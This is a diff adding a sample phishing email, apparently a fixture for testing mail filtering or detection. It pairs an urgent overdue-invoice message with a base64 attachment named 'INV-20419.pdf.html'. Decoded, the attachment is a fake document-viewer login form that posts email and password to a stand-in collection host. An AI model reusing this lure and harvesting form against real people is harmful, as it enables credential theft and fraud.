@@ -1,0 +1,39 @@
+Return-Path: <accounts@vendor-billing.test>
+Received: from mail.vendor-billing.test (mail.vendor-billing.test [192.0.2.77])
+	by mx1.example.com (Postfix) with ESMTPS id 9A8B7C6D5E
+	for <finance@example.com>; Fri, 09 Oct 2026 08:15:42 +0000 (UTC)
+Authentication-Results: mx1.example.com;
+	spf=pass smtp.mailfrom=vendor-billing.test;
+	dkim=pass header.d=vendor-billing.test;
+	dmarc=pass header.from=vendor-billing.test
+From: "Accounts Receivable" <accounts@vendor-billing.test>
+To: finance@example.com
+Subject: Overdue invoice INV-20419 - payment required today
+Date: Fri, 09 Oct 2026 08:15:40 +0000
+Message-ID: <a1b2c3d4@vendor-billing.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b2_SAMPLE"
+
+--b2_SAMPLE
+Content-Type: text/plain; charset=UTF-8
+
+Hello,
+
+Invoice INV-20419 is now 30 days overdue. Please open the attached document
+and process payment urgently to avoid late fees.
+
+Regards,
+Accounts Receivable
+
+--b2_SAMPLE
+Content-Type: text/html; name="INV-20419.pdf.html"
+Content-Disposition: attachment; filename="INV-20419.pdf.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGgzPlNlY3VyZSBEb2N1bWVudCBWaWV3ZXI8L2gzPjxwPlNpZ24gaW4gdG8g
+dmlldyBpbnZvaWNlIElOVi0yMDQxOS48L3A+PGZvcm0gYWN0aW9uPSJodHRwczovL2NvbGxlY3Qu
+aW52b2ljZS1zaGFyZS50ZXN0L3Bvc3QucGhwIiBtZXRob2Q9InBvc3QiPjxpbnB1dCBuYW1lPSJl
+bWFpbCI+PGlucHV0IG5hbWU9InBhc3N3b3JkIiB0eXBlPSJwYXNzd29yZCI+PGJ1dHRvbj5WaWV3
+PC9idXR0b24+PC9mb3JtPjwhLS0gU0FGRSBTQU1QTEU6IG5vIHNjcmlwdCwgZm9ybSBwb3N0cyB0
+byBhIC50ZXN0IGRvbWFpbiAtLT48L2JvZHk+PC9odG1sPg==
+--b2_SAMPLE--
